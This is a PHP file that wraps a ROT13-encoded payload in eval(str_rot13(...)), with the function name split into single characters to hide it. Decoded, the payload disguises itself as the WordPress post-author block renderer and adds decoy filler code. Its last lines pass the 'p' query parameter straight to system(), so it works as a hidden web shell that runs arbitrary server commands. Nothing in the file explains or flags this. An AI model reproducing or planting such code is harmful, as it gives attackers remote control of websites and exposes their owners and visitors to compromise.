<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-nhgube` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-nhgube` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 *
 * @cnenz  neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz  fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz  JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur eraqrerq nhgube oybpx.
 */
shapgvba eraqre_oybpx_pber_cbfg_nhgube( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		$nhgube_vq = trg_dhrel_ine( 'nhgube' );
	} ryfr {
		$nhgube_vq = trg_cbfg_svryq( 'cbfg_nhgube', $oybpx->pbagrkg['cbfgVq'] );
	}

	vs ( rzcgl( $nhgube_vq ) ) {
		erghea '';
	}

	vs ( vffrg( $oybpx->pbagrkg['cbfgGlcr'] ) && ! cbfg_glcr_fhccbegf( $oybpx->pbagrkg['cbfgGlcr'], 'nhgube' ) ) {
		erghea '';
	}

	$ningne = ! rzcgl( $nggevohgrf['ningneFvmr'] ) ? trg_ningne(
		$nhgube_vq,
		$nggevohgrf['ningneFvmr']
	) : ahyy;

	$yvax        = trg_nhgube_cbfgf_hey( $nhgube_vq );
	$nhgube_anzr = trg_gur_nhgube_zrgn( 'qvfcynl_anzr', $nhgube_vq );
	vs ( ! rzcgl( $nggevohgrf['vfYvax'] && ! rzcgl( $nggevohgrf['yvaxGnetrg'] ) ) ) {
		$nhgube_anzr = fcevags( '<n uers=\"%1$f\" gnetrg=\"%2$f\">%3$f</n>', rfp_hey( $yvax ), rfp_ngge( $nggevohgrf['yvaxGnetrg'] ), $nhgube_anzr );
	}

	$olyvar  = ! rzcgl( $nggevohgrf['olyvar'] ) ? $nggevohgrf['olyvar'] : snyfr;
	$pynffrf = neenl();
	vs ( vffrg( $nggevohgrf['vgrzfWhfgvsvpngvba'] ) ) {
		$pynffrf[] = 'vgrzf-whfgvsvrq-' . $nggevohgrf['vgrzfWhfgvsvpngvba'];
	}
	vs ( vffrg( $nggevohgrf['grkgNyvta'] ) ) {
		$pynffrf[] = 'unf-grkg-nyvta-' . $nggevohgrf['grkgNyvta'];
	}
	vs ( vffrg( $nggevohgrf['fglyr']['ryrzragf']['yvax']['pbybe']['grkg'] ) ) {
		$pynffrf[] = 'unf-yvax-pbybe';
	}

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'pynff' => vzcybqr( ' ', $pynffrf ) ) );

	erghea fcevags( '<qvi %1$f>', $jenccre_nggevohgrf ) .
	( ! rzcgl( $nggevohgrf['fubjNingne'] ) ? '<qvi pynff=\"jc-oybpx-cbfg-nhgube__ningne\">' . $ningne . '</qvi>' : '' ) .
	'<qvi pynff=\"jc-oybpx-cbfg-nhgube__pbagrag\">' .
	( ! rzcgl( $olyvar ) ? '<c pynff=\"jc-oybpx-cbfg-nhgube__olyvar\">' . jc_xfrf_cbfg( $olyvar ) . '</c>' : '' ) .
	'<c pynff=\"jc-oybpx-cbfg-nhgube__anzr\">' . $nhgube_anzr . '</c>' .
	( ! rzcgl( $nggevohgrf['fubjOvb'] ) ? '<c pynff=\"jc-oybpx-cbfg-nhgube__ovb\">' . trg_gur_nhgube_zrgn( 'hfre_qrfpevcgvba', $nhgube_vq ) . '</c>' : '' ) .
	'</qvi>' .
	'</qvi>';
}

/**
 * Ertvfgref gur `pber/cbfg-nhgube` oybpx ba gur freire.
 *
 * @fvapr 5.9.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_nhgube() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-nhgube',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_nhgube',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_nhgube' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>